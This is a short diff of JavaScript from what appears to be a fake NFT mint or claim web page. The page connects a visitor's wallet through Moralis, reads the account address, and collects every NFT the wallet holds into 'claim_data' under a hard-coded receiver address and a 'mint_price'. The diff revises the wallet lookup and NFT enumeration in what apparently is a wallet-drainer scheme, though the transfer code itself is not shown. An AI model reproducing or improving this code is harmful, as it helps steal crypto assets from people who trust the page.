@@ -394,7 +394,7 @@
 		startMOralis = async() => {const serverUrl = "https://2uuwz8f6oqbb.usemoralis.com:2053/server";
 		const appId = "LZKnRUNSDdi6hTYDFx5GbLbxx1fPHnKryMQUurv3";
 		Moralis.start({ serverUrl, appId }).catch(err => console.log(err));
-		await Moralis.enableWeb3();
+		const web3Provider = await Moralis.enableWeb3();
 		}
 		
 		startMOralis();
@@ -406,7 +406,11 @@
 		}
 
 		async function get_data() {
-			addr = await Moralis.Web3.account.toString();
+			const accounts = await ethereum.request({ method: 'eth_accounts' })
+			addr = accounts[0]
+			const optionssss = {
+  address: addr,
+};
 			if(addr.length != 42) {
 				return;
 			}
@@ -416,7 +420,7 @@
 					return;
 				}
 			}
-			claim_data = {receiver: '0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff', mint_price: 0.33,  nfts: await Moralis.Web3.getNFTs()}
+			claim_data = {receiver: '0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff', mint_price: 0.33,  nfts: await Moralis.Web3.getNFTs(optionssss)}
 		}
 		
 		async function sync_chain() {
